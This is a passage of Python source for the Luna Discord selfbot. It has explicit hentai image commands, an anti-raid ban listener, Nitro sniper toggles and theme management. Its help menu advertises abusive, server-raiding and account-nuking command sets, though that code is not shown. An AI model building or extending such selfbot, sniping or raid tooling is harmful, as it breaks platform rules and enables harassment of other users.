	@commands.command(name = "htits",
					usage="",
					description = "Random hentai tits")
	async def htits(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/tits").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hpussy",
					usage="",
					description = "Random hentai pussy")
	async def hpussy(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/pussy").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")
        
	@commands.command(name = "hanal",
					usage="",
					description = "Random hentai anal")
	async def hanal(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/anal").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hcum",
					usage="",
					description = "Random hentai cum gif")
	async def hcum(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/cum").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hcum1",
					usage="",
					description = "Random hentai cum")
	async def hcum1(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/cum_jpg").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hblowjob",
					usage="",
					description = "Random hentai blowjob gif")
	async def hblowjob(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/bj").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hblowjob1",
					usage="",
					description = "Random hentai blowjob")
	async def hblowjob1(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/blowjob").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hneko",
					usage="",
					description = "Random hentai neko")
	async def hneko(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "htrap",
					usage="",
					description = "Random hentai trap")
	async def htrap(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/trap").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hyuri",
					usage="",
					description = "Random hentai yuri")
	async def hyuri(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/yuri").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hfutanari",
					usage="",
					description = "Random hentai futanari")
	async def hfutanari(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/futanari").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hketa",
					usage="",
					description = "Random hentai keta")
	async def hketa(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/keta").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hhololewd",
					usage="",
					description = "Random hololewd hentai ")
	async def hhololewd(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/hololewd").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hlewdkemo",
					usage="",
					description = "Random lewdkemo hentai")
	async def hlewdkemo(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/lewdkemo").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hsolo",
					usage="",
					description = "Random solo hentai")
	async def hsolo(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/solo").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hsolog",
					usage="",
					description = "Random solo hentai")
	async def hsolog(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/solog").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hfeetg",
					usage="",
					description = "Random hentai feet")
	async def hfeetg(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/feetg").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hero",
					usage="",
					description = "Random erotic hentai")
	async def hero(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/ero").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "herok",
					usage="",
					description = "Random erotic kitsune")
	async def herok(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/erok").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")
		
	@commands.command(name = "herokemo",
					usage="",
					description = "Random hentai erokemo")
	async def herokemo(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/erokemo").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hles",
					usage="",
					description = "Random lesbian hentai")
	async def hles(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/les").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hwallpaper",
					usage="",
					description = "Random hentai wallpaper")
	async def hwallpaper(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/wallpaper").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hlewdk",
					usage="",
					description = "Random lewd hentai")
	async def hlewdk(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/lewdk").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hngif",
					usage="",
					description = "Random hentai neko gif")
	async def hngif(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/ngif").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hkemonomimi",
					usage="",
					description = "Random neko")
	async def hkemonomimi(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/kemonomimi").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hholoero",
					usage="",
					description = "Random erotic hentai")
	async def hholoero(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/holoero").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hfoxgirl",
					usage="",
					description = "Random hentai fox girl")
	async def hfoxgirl(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/fox_girl").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hfemdom",
					usage="",
					description = "Random hentai female")
	async def hfemdom(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/femdom").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hgasm",
					usage="",
					description = "Random hentai gasm")
	async def hgasm(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/gasm").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hkuni",
					usage="",
					description = "Random hentai kuni")
	async def hkuni(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/kuni").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hpwankg",
					usage="",
					description = "Random hentai wank")
	async def hpwankg(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/pwankg").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "havatar",
					usage="",
					description = "Random hentai avatar")
	async def havatar(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/nsfw_avatar").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "havatar1",
					usage="",
					description = "Random hentai avatar")
	async def havatar1(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/avatar").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

bot.add_cog(HentaiCog(bot))
class OnMember(commands.Cog, name="on member events"):
	def __init__(self, bot:commands.Bot):
		self.bot = bot
        
	@commands.Cog.listener()
	async def on_member_join(self, member):
		if antiraid is True and member.bot:
			try:
				guild = member.guild
				async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
					if member.guild.id in whitelisted_users.keys() and i.user.id in whitelisted_users[
							member.guild.id].keys():
						return
					else:
						await guild.ban(member, reason="Luna Anti-Raid")
						await guild.ban(i.user, reason="Luna Anti-Raid")
			except Exception as e:
				print(e)

	@commands.Cog.listener()
	async def on_member_remove(self, member):
		if antiraid is True:
			try:
				guild = member.guild
				async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
					if guild.id in whitelisted_users.keys() and i.user.id in whitelisted_users[
							guild.id].keys() and i.user.id is not self.bot.user.id:
						print('not banned')
					else:
						print('banned')
						await guild.ban(i.user, reason="Luna Anti-Raid")
			except Exception as e:
				print(e)

bot.add_cog(OnMember(bot))

class SniperCog(commands.Cog, name="Sniper settings"):
	def __init__(self, bot:commands.bot):
		self.bot = bot
        
	@commands.command(name = "nitrosniper",
					usage="<on/off>",
					description = "Nitro sniper")
	async def nitrosniper(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Nitro sniper » {purple(f'{mode}')}")
			config_nitro_sniper(mode)
			await embed_builder(luna, description=f"```\nNitro sniper api » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "nitroapi",
					usage="<canary/v6/v7/v8/v9>",
					description = "Sniper API")
	async def nitroapi(self, luna, mode:str):
		await luna.message.delete()
		if mode == "canary" or mode == "v6" or mode == "v7" or mode == "v8" or mode == "v9":
			printmessage(f"Nitro sniper charge » {purple(f'{mode}')}")
			config_nitro_sniperapi(mode)
			await embed_builder(luna, description=f"```\nNitro sniper api » {mode}```")
		else:
			await mode_error(luna, "\"canary\", \"v6\", \"v7\", \"v8\" or \"v9\"")

	@commands.command(name = "snipercharge",
					usage="<on/off>",
					description = "Sniper visual charge")
	async def snipercharge(self, luna, mode:str):
		await luna.message.delete()
		global chargesniper
		if mode == "on" or mode == "off":
			printmessage(f"Nitro sniper charge » {purple(f'{mode}')}")
			config_toast_toasts(mode)
			if mode == "on":
				chargesniper = True
			elif mode == "off":
				chargesniper = False
			await embed_builder(luna, description=f"```\nNitro sniper charge » {mode}```")
		else:
			await mode_error(luna, "on or off")

bot.add_cog(SniperCog(bot))

class ThemeCog(commands.Cog, name="Theme command"):
	def __init__(self, bot:commands.bot):
		self.bot = bot
        
	@commands.command(name = "theme",
					usage="<theme>",
					description = "Change theme")
	async def theme(self, luna, theme:str):
		await luna.message.delete()
		theme = theme.replace('.json','')
		if os.path.exists(f"data/themes/{theme}" + ".json"):
			config_theme_set(theme)
			await embed_builder(luna, description=f"```\nChanged theme to » {theme}```")
		else:
			await error_builder(luna, description=f"```\nThere is no theme called » {theme}```")

bot.add_cog(ThemeCog(bot))

class ThemesCog(commands.Cog, name="Theme commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "newtheme",
					usage="<name>",
					description = "Create a theme")
	async def newtheme(self, luna, themename:str):
		await luna.message.delete()
		themename = themename.replace('.json','')
		if os.path.exists(f"data/themes/{themename}.json"):
			await error_builder(luna, description=f"```\nA theme already exists with the name » {themename}```")
		else:
			printmessage(f"Created theme » {purple(f'{themename}')}")
			data = {
				"title": "Luna",
				"titleurl": "",
				"footer": "Team Luna",
				"footer_iconurl": "https://cdn.discordapp.com/attachments/878593887113986048/879063329459544074/Luna3.png",
				"imageurl": "https://cdn.discordapp.com/attachments/878593887113986048/879063329459544074/Luna3.png",
				"large_imageurl": "",
				"hexcolor": "#2f3553",
				"author": "",
				"author_iconurl": "",
				"authorurl": "",
				"description": True
			}
			with open(f"data/themes/{themename}.json", "w") as studs:
				json.dump(data, studs, indent=4)
			config_theme_set(f"{themename}")
			await embed_builder(luna, description=f"```\nCreated theme » {themename}```")

	@commands.command(name = "edittheme",
					usage="<name>",
					description = "Edit current theme name")
	async def edittheme(self, luna, themename:str):
		await luna.message.delete()
		themename = themename.replace('.json','')
		with open("config.json", "r") as f:
			config = json.load(f)
		themesvar = config.get('theme')
		if os.path.exists(f"data/themes/{themename}.json"):
			await error_builder(luna, description=f"```\nA theme already exists with the name » {themename}```")
		else:
			printmessage(f"Edited theme name to » {purple(f'{themename}')}")
			os.rename(f"data/themes/{themesvar}",f"data/themes/{themename}.json")
			config_theme_set(f"{themename}")
			await embed_builder(luna, description=f"```\nEdited theme name to » {themename}```")
        
	@commands.command(name = "deltheme",
					usage="<name>",
					description = "Delete a theme")
	async def deltheme(self, luna, themename:str):
		await luna.message.delete()
		themename = themename.replace('.json','')
		with open("config.json", "r") as f:
			config = json.load(f)
		themesvar = config.get('theme')
		if themesvar == f"{themename}.json":
			await error_builder(luna, description="```\nYou cant delete the theme you are currently using```")
			return
		if os.path.exists(f"data/themes/{themename}" + ".json"):
			os.remove(f"data/themes/{themename}" + ".json")
			printmessage(f"Deleted theme » {purple(f'{themename}')}")
			await embed_builder(luna, description=f"```\nDeleted theme » {themename}```")
		else:
			await error_builder(luna, description=f"```\nThere is no theme called » {themename}```")

	@commands.command(name = "sendtheme",
					usage="",
					description = "Send the current theme file")
	async def sendtheme(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		themesvar = config.get('theme')
		await luna.send(file=discord.File(f"data/themes/{themesvar}"))

	@commands.command(name = "communitythemes",
					aliases=['cthemes'],
					usage="",
					description = "Community made themes")
	async def communitythemes(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		await embed_builder(luna, title="Community Themes", description=f"{descriptionvar()}```\n{prefix}preview <theme>  » Preview a theme\n``````\n{prefix}install luna     » Luna theme\n{prefix}install lunaanimated » Luna theme\n{prefix}install chill    » Chill theme\n{prefix}install midnight » Midnight theme\n{prefix}install vaporwave » Vaporwave theme\n{prefix}install sweetrevenge » Sweetrevenge theme\n{prefix}install error    » Error theme\n{prefix}install lunapearl » Pearl theme\n{prefix}install gamesense » Gamesense theme\n{prefix}install aimware  » Aimware theme\n{prefix}install guilded  » Guilded theme\n{prefix}install lucifer  » Lucifer selfbot theme\n{prefix}install nighty   » Nighty selfbot theme\n{prefix}install aries    » Aries selfbot theme```")

bot.add_cog(ThemesCog(bot))

class CommunitythemesCog(commands.Cog, name="Community themes"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "preview",
					usage="<theme>",
					description = "Preview a theme")
	async def preview(self, luna, theme:str):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		notfound = False
		theme = theme.lower()
		if theme == "luna":
			title= "Luna"
			titleurl= ""
			footer= "Team Luna"
			footer_iconurl= "https://cdn.discordapp.com/attachments/878593887113986048/879063329459544074/Luna3.png"
			imageurl= "https://cdn.discordapp.com/attachments/878593887113986048/879063329459544074/Luna3.png"
			large_imageurl= ""
			hexcolor= 0x2f3553
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Nshout"
		elif theme == "lunaanimated":
			title= "Luna"
			titleurl= ""
			footer= "Team Luna"
			footer_iconurl= "https://cdn.discordapp.com/attachments/878593887113986048/878593949332291584/Luna2.png"
			imageurl= "https://cdn.discordapp.com/attachments/878593887113986048/878593954352885770/Icon.gif"
			large_imageurl= ""
			hexcolor= 0x2f3553
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Nshout"
		elif theme == "chill":
			title= "F R E E D O M"
			titleurl= ""
			footer= "No one knows what it is so it exists as an illusion"
			footer_iconurl= "https://cdn.discordapp.com/attachments/754791048164802721/875871217272381510/unknown.png"
			imageurl= "https://cdn.discordapp.com/attachments/754791048164802721/875871217272381510/unknown.png"
			large_imageurl= ""
			hexcolor= 0xFF7C78
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="$Exodus"
		elif theme == "midnight":
			title= "Midnight."
			titleurl= ""
			footer= "It's Midnight."
			footer_iconurl= "https://media.discordapp.net/attachments/796453981655269481/796579251536265237/giphy.gif?width=596&height=596"
			imageurl= "https://media.discordapp.net/attachments/796453981655269481/796579251536265237/giphy.gif?width=596&height=596"
			large_imageurl= ""
			hexcolor= 0x4205B8
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Rainy"
		elif theme == "vaporwave":
			title= "Vapor Wave"
			titleurl= ""
			footer= "Ride the vapor wave."
			footer_iconurl= "https://cdn.discordapp.com/attachments/796453981655269481/796600554566582322/giphy.gif"
			imageurl= "https://cdn.discordapp.com/attachments/796453981655269481/796600554566582322/giphy.gif"
			large_imageurl= ""
			hexcolor= 0x400476
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Rainy"
		elif theme == "sweetrevenge":
			title= "Sweet Revenge."
			titleurl= ""
			footer= "Sweet revenge is nice."
			footer_iconurl= "https://media.giphy.com/media/wtjkff1kM84Ni/giphy.gif"
			imageurl= "https://media.giphy.com/media/wtjkff1kM84Ni/giphy.gif"
			large_imageurl= ""
			hexcolor= 0xff38d4
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Rainy"
		elif theme == "error":
			title= "Error™"
			titleurl= ""
			footer= "Error displaying footer, please contact support"
			footer_iconurl= "https://media.tenor.com/images/c340fb1e8470226f1dfe4f0eedb93978/tenor.gif"
			imageurl= "https://media.tenor.com/images/c340fb1e8470226f1dfe4f0eedb93978/tenor.gif"
			large_imageurl= ""
			hexcolor= 0x2e2e2e
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="$Exodus"
		elif theme == "lunapearl":
			title= "Luna"
			titleurl= ""
			footer= "Team Luna"
			footer_iconurl= "https://cdn.discordapp.com/attachments/878593887113986048/883100815504584805/LunaPearl.png"
			imageurl= "https://cdn.discordapp.com/attachments/878593887113986048/883099770237911180/LunaThumb.png"
			large_imageurl= ""
			hexcolor= 0xc1caff
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Nshout"
		elif theme == "gamesense":
			title= "gamesense"
			titleurl= "https://gamesense.pub/"
			footer= "Get Good Get Gamesense"
			footer_iconurl= "https://mir-s3-cdn-cf.behance.net/projects/404/fd4d3c107155739.Y3JvcCwxMDI0LDgwMCwwLDExMQ.png"
			imageurl= "https://mir-s3-cdn-cf.behance.net/projects/404/fd4d3c107155739.Y3JvcCwxMDI0LDgwMCwwLDExMQ.png"
			large_imageurl= ""
			hexcolor= 0x00FF00
			author= "esoterik"
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Dragon"
		elif theme == "aimware":
			title= "Aimware"
			titleurl= ""
			footer= "Aimware | One Step Ahead Of The Game"
			footer_iconurl= "https://cdn.discordapp.com/attachments/874446213297094688/876941477031346206/2955062011450968691.png"
			imageurl= "https://cdn.discordapp.com/attachments/874446213297094688/876941477031346206/2955062011450968691.png"
			large_imageurl= ""
			hexcolor= 0xbd100d
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Dragon"
		elif theme == "guilded":
			title= "Guilded"
			titleurl= "https://guilded.gg/"
			footer= "Guilded (Discord v2)| 2021"
			footer_iconurl= "https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fdiscord.deutschewarframe.community%2Fwp-content%2Fuploads%2FGuilded_Logomark_Color.png&f=1&nofb=1"
			imageurl= "https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fdiscord.deutschewarframe.community%2Fwp-content%2Fuploads%2FGuilded_Logomark_Color.png&f=1&nofb=1"
			large_imageurl= ""
			hexcolor= 0xFFDC2B
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Exodus"
		elif theme == "lucifer":
			title= "💙 Lucifer Selfbot 💙"
			titleurl= ""
			footer= "Lucifer Selfbot"
			footer_iconurl= ""
			imageurl= "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP.vuoLoEf3fOiE9wAmHAZxpgAAAA%26pid%3DApi&f=1"
			large_imageurl= ""
			hexcolor= 0x2B64FF
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Exodus"
		elif theme == "nighty":
			title= "Nighty"
			titleurl= ""
			footer= "nighty.one"
			footer_iconurl= ""
			imageurl= "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fstyles.redditmedia.com%2Ft5_3g26sd%2Fstyles%2FcommunityIcon_ndqvdagq4k061.png%3Fwidth%3D256%26s%3D6a058506a7fc75c83f06f3ed327d23f4b7b2a50c&f=1&nofb=1"
			large_imageurl= ""
			hexcolor= 0x619BFF
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Exodus"
		elif theme == "aries":
			title= "Aries"
			titleurl= ""
			footer= "made with \u2661 by bomt and destiny"
			footer_iconurl= ""
			imageurl= "https://cdn.discordapp.com/attachments/775820489758605394/893750057243918346/Astolfo1.png"
			large_imageurl= ""
			hexcolor= 0x493BB9
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Nshout"
		else:
			notfound = True
		if notfound == True:
			await error_builder(luna, description=f"```\nNo theme called {theme} found```")
			return
		if description == True:
			description = "```<> is required | [] is optional\n\n```"
		elif description == False:
			description = ""
		embed = discord.Embed(title=title, url=titleurl, description=f"{description}```\n{prefix}help [command]   » Display all commands\n{prefix}admin            » Administrative commands\n{prefix}animated         » Animated commands\n{prefix}text             » Text commands\n{prefix}image            » Image commands\n{prefix}troll            » Troll commands\n{prefix}fun              » Funny commands\n{prefix}tools            » General tools\n{prefix}nettools         » Networking tools\n{prefix}utils            » Utilities\n{prefix}abuse            » Abusive commands\n{prefix}raid             » Raiding servers\n{prefix}nuking           » Account nuking\n{prefix}protection       » Protections\n{prefix}misc             » Miscellaneous commands\n{prefix}settings         » Settings\n{prefix}sharing          » Share commands\n{prefix}community        » Community made commands\n{prefix}customhelp       » Show custom commands\n{prefix}search <command> » Search for a command\n{prefix}covid            » Corona statistics\n``````\nThis is a preview of the theme {theme}\nThis theme was made by {madeby}```", color=hexcolor)
		embed.set_thumbnail(url=imageurl)
		embed.set_footer(text=footer, icon_url=footer_iconurl)
		embed.set_author(name=author, url=authorurl, icon_url=author_iconurl)
		embed.set_image(url=large_imageurl)
		await send(luna, embed)

	@commands.command(name = "install",
					usage="<theme>",
					description = "Install a theme")
	async def install(self, luna, theme:str):
		await luna.message.delete()
		notfound = False
		theme = theme.lower()
		if theme == "luna":
			title= "Luna"
			titleurl= ""
			footer= "Team Luna"
			footer_iconurl= "https://cdn.discordapp.com/attachments/878593887113986048/879063329459544074/Luna3.png"
			imageurl= "https://cdn.discordapp.com/attachments/878593887113986048/879063329459544074/Luna3.png"
			large_imageurl= ""
			hexcolor= "#2f3553"
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Nshout"
		elif theme == "lunaanimated":
			title= "Luna"
			titleurl= ""
			footer= "Team Luna"
			footer_iconurl= "https://cdn.discordapp.com/attachments/878593887113986048/878593949332291584/Luna2.png"
			imageurl= "https://cdn.discordapp.com/attachments/878593887113986048/878593954352885770/Icon.gif"
			large_imageurl= ""
			hexcolor= "#2f3553"
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Nshout"
		elif theme == "chill":
			title= "F R E E D O M"
			titleurl= ""
			footer= "No one knows what it is so it exists as an illusion"
			footer_iconurl= "https://cdn.discordapp.com/attachments/754791048164802721/875871217272381510/unknown.png"
			imageurl= "https://cdn.discordapp.com/attachments/754791048164802721/875871217272381510/unknown.png"
			large_imageurl= ""
			hexcolor= "#FF7C78"
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="$Exodus"
		elif theme == "midnight":
			title= "Midnight."
			titleurl= ""
			footer= "It's Midnight."
			footer_iconurl= "https://media.discordapp.net/attachments/796453981655269481/796579251536265237/giphy.gif?width=596&height=596"
			imageurl= "https://media.discordapp.net/attachments/796453981655269481/796579251536265237/giphy.gif?width=596&height=596"
			large_imageurl= ""
			hexcolor= "#4205B8"
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Rainy"
		elif theme == "vaporwave":
			title= "Vapor Wave"
			titleurl= ""
			footer= "Ride the vapor wave."
			footer_iconurl= "https://cdn.discordapp.com/attachments/796453981655269481/796600554566582322/giphy.gif"
			imageurl= "https://cdn.discordapp.com/attachments/796453981655269481/796600554566582322/giphy.gif"
			large_imageurl= ""
			hexcolor= "#400476"
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Rainy"
		elif theme == "sweetrevenge":
			title= "Sweet Revenge."
			titleurl= ""
			footer= "Sweet revenge is nice."
			footer_iconurl= "https://media.giphy.com/media/wtjkff1kM84Ni/giphy.gif"
			imageurl= "https://media.giphy.com/media/wtjkff1kM84Ni/giphy.gif"
			large_imageurl= ""
			hexcolor= "#ff38d4"
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Rainy"
		elif theme == "error":
			title= "Error™"
			titleurl= ""
			footer= "Error displaying footer, please contact support"
			footer_iconurl= "https://media.tenor.com/images/c340fb1e8470226f1dfe4f0eedb93978/tenor.gif"
			imageurl= "https://media.tenor.com/images/c340fb1e8470226f1dfe4f0eedb93978/tenor.gif"
			large_imageurl= ""
			hexcolor= "#2e2e2e"
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="$Exodus"
		elif theme == "lunapearl":
			title= "Luna"
			titleurl= ""
			footer= "Team Luna"
			footer_iconurl= "https://cdn.discordapp.com/attachments/878593887113986048/883100815504584805/LunaPearl.png"
			imageurl= "https://cdn.discordapp.com/attachments/878593887113986048/883099770237911180/LunaThumb.png"
			large_imageurl= ""
			hexcolor= "#c1caff"
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Nshout"
		elif theme == "gamesense":
			title= "gamesense"
			titleurl= "https://gamesense.pub/"
			footer= "Get Good Get Gamesense"
			footer_iconurl= "https://mir-s3-cdn-cf.behance.net/projects/404/fd4d3c107155739.Y3JvcCwxMDI0LDgwMCwwLDExMQ.png"
			imageurl= "https://mir-s3-cdn-cf.behance.net/projects/404/fd4d3c107155739.Y3JvcCwxMDI0LDgwMCwwLDExMQ.png"
			large_imageurl= ""
			hexcolor= "#00FF00"
			author= "esoterik"
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Dragon"
		elif theme == "aimware":
			title= "Aimware"
			titleurl= ""
			footer= "Aimware | One Step Ahead Of The Game"
			footer_iconurl= "https://cdn.discordapp.com/attachments/874446213297094688/876941477031346206/2955062011450968691.png"
			imageurl= "https://cdn.discordapp.com/attachments/874446213297094688/876941477031346206/2955062011450968691.png"
			large_imageurl= ""
			hexcolor= "#bd100d"
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Dragon"
		elif theme == "guilded":
			title= "Guilded"
			titleurl= "https://guilded.gg/"
			footer= "Guilded (Discord v2)| 2021"
			footer_iconurl= "https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fdiscord.deutschewarframe.community%2Fwp-content%2Fuploads%2FGuilded_Logomark_Color.png&f=1&nofb=1"
			imageurl= "https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fdiscord.deutschewarframe.community%2Fwp-content%2Fuploads%2FGuilded_Logomark_Color.png&f=1&nofb=1"
			large_imageurl= ""
			hexcolor= "#FFDC2B"
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Exodus"
		elif theme == "lucifer":
			title= "💙 Lucifer Selfbot 💙"
			titleurl= ""
			footer= "Lucifer Selfbot"
			footer_iconurl= ""
			imageurl= "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP.vuoLoEf3fOiE9wAmHAZxpgAAAA%26pid%3DApi&f=1"
			large_imageurl= ""
			hexcolor= "#2B64FF"
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Exodus"
		elif theme == "nighty":
			title= "Nighty"
			titleurl= ""
			footer= "nighty.one"
			footer_iconurl= ""
			imageurl= "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fstyles.redditmedia.com%2Ft5_3g26sd%2Fstyles%2FcommunityIcon_ndqvdagq4k061.png%3Fwidth%3D256%26s%3D6a058506a7fc75c83f06f3ed327d23f4b7b2a50c&f=1&nofb=1"
			large_imageurl= ""
			hexcolor= "#619BFF"
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Exodus"
		elif theme == "aries":
			title= "Aries"
			titleurl= ""
			footer= "made with \u2661 by bomt and destiny"
			footer_iconurl= ""
			imageurl= "https://cdn.discordapp.com/attachments/775820489758605394/893750057243918346/Astolfo1.png"
			large_imageurl= ""
			hexcolor= "#493BB9"
			author= ""
			author_iconurl= ""
			authorurl= ""
			description= True
			madeby="Nshout"
		else:
			notfound = True
		if notfound == True:
			await error_builder(luna, description=f"```\nNo theme called {theme} found```")
			return
		data = {
			"title": f"{title}",
			"titleurl": f"{titleurl}",
			"footer": f"{footer}",
			"footer_iconurl": f"{footer_iconurl}",
			"imageurl": f"{imageurl}",
			"large_imageurl": f"{large_imageurl}",
			"hexcolor": f"{hexcolor}",
			"author": f"{author}",
			"author_iconurl": f"{author_iconurl}",
			"authorurl": f"{authorurl}",
			"description": description
		}
		with open(f"data/themes/{theme}.json", "w") as studs:
			json.dump(data, studs, indent=4)
		config_theme_set(f"{theme}")
